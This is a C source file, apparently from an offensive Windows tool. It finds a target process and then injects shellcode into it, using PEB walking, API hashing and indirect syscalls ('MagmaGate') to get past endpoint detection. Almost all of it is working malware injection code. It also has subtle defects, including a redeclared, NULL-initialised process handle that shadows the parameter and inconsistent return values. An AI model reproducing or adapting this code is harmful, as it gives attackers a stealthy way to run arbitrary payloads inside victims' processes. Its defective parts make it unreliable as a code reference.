#include "IS.h"
#include "box.h"
#include "struct.h"

BOOL GetRemoteProcID
(
	IN LPCWSTR ProcName,
	OUT PDWORD PID,
	OUT PHANDLE hProcess
)

{

	fnNtQuerySystemInformation		pNtQuerySystemInformation	= NULL;
	ULONG							uReturnLen1					= 0, 
									uReturnLen2					= 0;
	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo				= NULL;
	PVOID							pValueToFree				= NULL;
	NTSTATUS						STATUS						= 0;


	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation");
	if (pNtQuerySystemInformation == NULL) {
		PRINT_ERROR("GetProcAddress");
		return FALSE;
	}

	pNtQuerySystemInformation(SystemProcessInformation, NULL, 0, &uReturnLen1);

	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL)
	{
		PRINT_ERROR("HeapAlloc");
		return FALSE;
	}

	pValueToFree = SystemProcInfo;

	STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != 0x0) {
		PRINT_ERROR("NtQuerySystemInformation");
		return FALSE;
	}

	while (TRUE) {
		if (SystemProcInfo->ImageName.Length && _wcsicmp(SystemProcInfo->ImageName.Buffer, ProcName) == 0)
		{
			*PID = (DWORD)SystemProcInfo->UniqueProcessId;
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *PID);
			break;
		}

		if (!SystemProcInfo->NextEntryOffset)
			break;

		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);

	}

	HeapFree(GetProcessHeap(), 0, pValueToFree);

	if (*PID == NULL || *hProcess == NULL)
		return FALSE;
	else
		return TRUE;
}

/*-----------------------------------------------------[Indirect Syscalls]------------------------------------------------------*/


BOOL IndirectShellInjection(
	IN DWORD PID,
	IN HANDLE hProcess,
	IN PBYTE pShellcode,
	IN SIZE_T sSizeofShellcode
)

{


	NTSTATUS					STATUS			= STATUS_SUCCESS;
	HANDLE						hProcess		= NULL;
	HANDLE						hThread			= NULL;
	PVOID						rBuffer			= NULL;
	DWORD						TID				= 0;
	BOOL						State			= TRUE;
	HMODULE						NtdllHandle		= NULL;
	DWORD						OldProtection	= 0;
	SIZE_T						BytesWritten	= 0;
	SIZE_T						origSize		= sSizeofShellcode;
	SIZE_T						regionSize		= sSizeofShellcode;
	CLIENT_ID					CID				= { (HANDLE)PID, NULL };
	OBJECT_ATTRIBUTES			OA				= { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);
	PIMAGE_EXPORT_DIRECTORY		pImgDir			= NULL;
	SYSCALL_INFO				info			= { 0 };
	INSTRUCTIONS_INFO			syscallInfos[7] = { 0 };

	HMODULE ntdll = WalkPeb();
	if (!ntdll)
	{
		PRINT_ERROR("WalkPeb");
		return 1;
	}

	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);

	if (!GetEAT(ntdll, &pImgDir))
	{
		PRINT_ERROR("GetEAT");
		return 1;
	}

	const CHAR* Functions[] =
	{
		"NtAllocateVirtualMemory",
		"NtWriteVirtualMemory",
		"NtProtectVirtualMemory",
		"NtCreateThreadEx",
		"NtWaitForSingleObject",
		"NtFreeVirtualMemory",
		"NtClose"
	};

	size_t FuncSize = ARRAYSIZE(Functions);

	for (size_t i = 0; i < FuncSize; i++)
	{
		DWORD apiHash = sdbmrol16(
			Functions[i]
		);

		MagmaGate(pImgDir, ntdll, apiHash, &info);

		syscallInfos[i].SSN = info.SSN;
		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
	}


	/*--------------------------------------------------[Externally calling all function from Magma.asm]-------------------------------------------------------*/

	OKAY("[0x%p] Successfully Got a handle to the process: [%ld]", hProcess, PID);

	// allocate SizeofShellcode to VirtualMemory
	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtAllocateVirtualMemory
	STATUS = ((NTSTATUS(*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG))SyscallInvoker)
		(hProcess, &rBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtAllocateVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Allocated %zu Bytes to Virtual Memory!", sSizeofShellcode);


	/*------------------------------------------------------------------------[Writing Shellcode to Virtual Memory]-----------------------------------------------------------*/


	// Write the newly decrypted shellcode inside
	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtWriteVirtualMemory
	STATUS = ((NTSTATUS(*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))SyscallInvoker)
		(hProcess, rBuffer, pShellcode, origSize, &BytesWritten);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtWriteVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Wrote %zu Bytes to the Virtual Memory!", BytesWritten);

	// change permissions
	SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtProtectVirtualMemory
	STATUS = ((NTSTATUS(*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG))SyscallInvoker)
		(hProcess, &rBuffer, &origSize, PAGE_EXECUTE_READ, &OldProtection);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtProtectVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Changed Allocation Protection from [RW] to [RX]");

	// Create Thread Pointing to Our Payload

	SetConfig(syscallInfos[3].SSN, syscallInfos[3].SyscallInstruction); // NtCreateThreadEx
	STATUS = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST))SyscallInvoker)
		(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, FALSE, 0, 0, 0, NULL);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtCreateThreadEx Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("[0x%p] Successfully Created a Thread!", hThread);
	INFO("Waiting for Thread to finish executing...");
	SetConfig(syscallInfos[4].SSN, syscallInfos[4].SyscallInstruction); // NtWaitForSingleObject
	STATUS = ((NTSTATUS(*)(HANDLE, BOOLEAN, PLARGE_INTEGER))SyscallInvoker)
		(hThread, FALSE, NULL);
	INFO("Execution Completed! Cleaning Up!");




CLEANUP:


	if (rBuffer) {
		SetConfig(syscallInfos[5].SSN, syscallInfos[5].SyscallInstruction); // NtFreeVirtualMemory
		STATUS = ((NTSTATUS(*)(HANDLE, PVOID*, PSIZE_T, ULONG))SyscallInvoker)
			(hProcess, &rBuffer, &sSizeofShellcode, MEM_DECOMMIT);
		if (STATUS_SUCCESS != STATUS) {
			WARN("NtFreeVirtualMemory", STATUS);
		}
		else {
			INFO("[0x%p] decommitted allocated buffer from process memory", rBuffer);
		}
	}

	if (hThread) {
		SetConfig(syscallInfos[6].SSN, syscallInfos[6].SyscallInstruction); // NtClose
		STATUS = ((NTSTATUS(*)(HANDLE))SyscallInvoker)
		(hThread);
		INFO("[0x%p] handle on thread closed", hThread);
	}

	if (hProcess) {
		SetConfig(syscallInfos[6].SSN, syscallInfos[6].SyscallInstruction); // NtClose
		STATUS = ((NTSTATUS(*)(HANDLE))SyscallInvoker)
		(hProcess);
		INFO("[0x%p] handle on process closed", hProcess);


	}
}